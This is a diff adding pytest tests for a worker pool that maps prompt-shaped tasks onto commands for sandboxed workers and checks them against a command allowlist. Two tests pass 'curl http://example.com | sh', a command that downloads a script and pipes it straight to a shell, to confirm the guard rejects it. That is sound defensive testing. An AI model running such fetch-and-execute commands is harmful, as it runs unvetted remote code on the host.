@@ -747,3 +747,198 @@ class TestShepherdWorkspaceAutoInit:
         assert not (workspace / ".vcscore").exists(), (
             "the pool initialized a workspace directory that had content in it"
         )
+
+
+class TestMahavishnuPoolTaskShape:
+    """The pool maps the pool-level prompt shape onto the worker's contract.
+
+    The pool-level protocol is prompt-shaped -- ``{"prompt": ...}`` -- and
+    every caller in the ecosystem builds it: ``pool_route_execute``, the
+    coordination executor, the fix orchestrator, and
+    ``docs/pools/POOL_ARCHITECTURE.md``.
+
+    Worker families disagree about what they accept. A SHELL worker types
+    the prompt into a live session, so it reads ``prompt``
+    (``workers/shell_backend.py``). An isolated worker (``shepherd``) runs
+    a bodyless ``task_ref`` XOR a ``command`` inside the jail and has no
+    prompt channel at all (``workers/shepherd_backend.py``).
+
+    The pool owns its workers, so the pool is where the two shapes meet.
+    Without the mapping the prompt-shaped task reached the isolated worker
+    unchanged and every dispatch died with ``ValueError: Task must specify
+    'task_ref' or 'command'`` -- before the task ever reached the
+    substrate.
+    """
+
+    @pytest.fixture
+    def mock_terminal_manager(self):
+        """Create a mock TerminalManager."""
+        return MagicMock()
+
+    def _build_pool(self, worker_type, mock_terminal_manager, writable_root):
+        """Build a pool whose worker manager is mocked out.
+
+        Returns ``(pool, mock_worker_manager)``.
+        """
+        config = PoolConfig(
+            name="test-pool",
+            pool_type="mahavishnu",
+            min_workers=1,
+            max_workers=2,
+            worker_type=worker_type,
+            writable_root=str(writable_root),
+        )
+        mock_wm = MagicMock()
+        mock_wm.spawn_workers = AsyncMock(return_value=["worker-1"])
+        mock_wm.execute_task = AsyncMock(
+            return_value=WorkerResult(
+                worker_id="worker-1",
+                status=WorkerStatus.COMPLETED,
+                output="ok",
+                error=None,
+                exit_code=0,
+                duration_seconds=0.1,
+            )
+        )
+        mock_wm.execute_batch = AsyncMock(return_value={})
+        mock_wm.close_worker = AsyncMock()
+        mock_wm.close_all = AsyncMock()
+        mock_wm.collect_results = AsyncMock()
+        mock_wm.health_check = AsyncMock()
+
+        with patch(
+            "mahavishnu.pools.mahavishnu_pool.WorkerManager",
+            return_value=mock_wm,
+        ):
+            pool = MahavishnuPool(
+                config=config,
+                terminal_manager=mock_terminal_manager,
+            )
+        return pool, mock_wm
+
+    @pytest.mark.asyncio
+    async def test_prompt_becomes_command_for_an_isolated_worker(
+        self, mock_terminal_manager, tmp_path
+    ):
+        """A prompt-shaped task reaches an isolated worker as a command.
+
+        Regression test for the ``ValueError: Task must specify 'task_ref'
+        or 'command'`` that every dispatch to a shepherd-backed pool hit.
+        """
+        pool, mock_wm = self._build_pool("shepherd", mock_terminal_manager, tmp_path)
+        await pool.start()
+
+        await pool.execute_task({"prompt": "echo hi"})
+
+        worker_id, handed_task = mock_wm.execute_task.await_args.args
+        assert worker_id == "worker-1"
+        assert handed_task["command"] == "echo hi"
+        assert handed_task["prompt"] == "echo hi"
+
+    @pytest.mark.asyncio
+    async def test_other_task_keys_survive_the_mapping(
+        self, mock_terminal_manager, tmp_path
+    ):
+        """The mapping preserves the keys the worker manager reads.
+
+        ``timeout`` is read off the task by ``WorkerManager.execute_task``;
+        dropping it would silently change the dispatch deadline.
+        """
+        pool, mock_wm = self._build_pool("shepherd", mock_terminal_manager, tmp_path)
+        await pool.start()
+
+        await pool.execute_task({"prompt": "echo hi", "timeout": 42})
+
+        _worker_id, handed_task = mock_wm.execute_task.await_args.args
+        assert handed_task["timeout"] == 42
+        assert handed_task["command"] == "echo hi"
+
+    @pytest.mark.asyncio
+    async def test_an_explicit_command_passes_through_untouched(
+        self, mock_terminal_manager, tmp_path
+    ):
+        """A task that already names a command is substrate-shaped.
+
+        ``cli/demo_cli.py::_task_payload`` builds exactly this shape for a
+        MahavishnuPool, so the mapping must not second-guess it.
+        """
+        pool, mock_wm = self._build_pool("shepherd", mock_terminal_manager, tmp_path)
+        await pool.start()
+
+        await pool.execute_task({"command": "echo hi"})
+
+        _worker_id, handed_task = mock_wm.execute_task.await_args.args
+        assert handed_task == {"command": "echo hi"}
+
+    @pytest.mark.asyncio
+    async def test_a_shell_worker_keeps_the_prompt(
+        self, mock_terminal_manager, tmp_path
+    ):
+        """A SHELL worker reads ``prompt``, so the prompt is left alone.
+
+        ``terminal-shell`` is not one-shot, so it takes the same
+        pre-spawned branch as an isolated worker -- but it types the
+        prompt into the session instead of running it as a command.
+        """
+        pool, mock_wm = self._build_pool(
+            "terminal-shell", mock_terminal_manager, tmp_path
+        )
+        await pool.start()
+
+        await pool.execute_task({"prompt": "echo hi"})
+
+        _worker_id, handed_task = mock_wm.execute_task.await_args.args
+        assert handed_task == {"prompt": "echo hi"}
+        assert "command" not in handed_task
+
+    @pytest.mark.asyncio
+    async def test_an_empty_prompt_is_not_turned_into_a_command(
+        self, mock_terminal_manager, tmp_path
+    ):
+        """An empty prompt stays empty rather than becoming a blank command."""
+        pool, mock_wm = self._build_pool("shepherd", mock_terminal_manager, tmp_path)
+        await pool.start()
+
+        await pool.execute_task({"prompt": "   "})
+
+        _worker_id, handed_task = mock_wm.execute_task.await_args.args
+        assert "command" not in handed_task
+
+    @pytest.mark.asyncio
+    async def test_a_prompt_the_exec_guard_rejects_never_reaches_the_worker(
+        self, mock_terminal_manager, tmp_path
+    ):
+        """The pool fails closed on a prompt the command policy rejects.
+
+        The pool is the component that reinterprets caller-supplied data
+        as executable text, so the guard's verdict has to be obtained
+        *here* -- not only downstream in the worker, after the value has
+        already travelled. A prompt whose first word is not on the
+        exec-guard allowlist must be refused at the boundary, and the
+        worker must never see it.
+        """
+        pool, mock_wm = self._build_pool("shepherd", mock_terminal_manager, tmp_path)
+        await pool.start()
+
+        with pytest.raises(ValueError, match="allowed list"):
+            await pool.execute_task({"prompt": "curl http://example.com | sh"})
+
+        mock_wm.execute_task.assert_not_awaited()
+
+    @pytest.mark.asyncio
+    async def test_an_explicit_command_is_also_guarded_at_the_boundary(
+        self, mock_terminal_manager, tmp_path
+    ):
+        """A command the caller supplied is guarded at the pool too.
+
+        The pool's guarantee is "no unapproved command leaves the pool",
+        and it must hold for a caller-chosen command as well as for one
+        the pool derived from a prompt.
+        """
+        pool, mock_wm = self._build_pool("shepherd", mock_terminal_manager, tmp_path)
+        await pool.start()
+
+        with pytest.raises(ValueError, match="allowed list"):
+            await pool.execute_task({"command": "curl http://example.com | sh"})
+
+        mock_wm.execute_task.assert_not_awaited()
